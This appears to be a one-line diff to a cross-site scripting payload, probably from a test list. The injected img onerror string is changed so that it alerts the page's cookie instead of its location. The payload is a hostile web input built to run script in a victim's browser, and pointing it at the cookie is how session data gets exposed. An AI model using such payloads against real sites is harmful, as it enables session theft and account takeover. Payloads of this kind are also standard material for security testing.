@@ -1,1 +1,1 @@
-"><img src=x onerror=alert(document.location)>
+"><img src=x onerror=alert(document.cookie)>
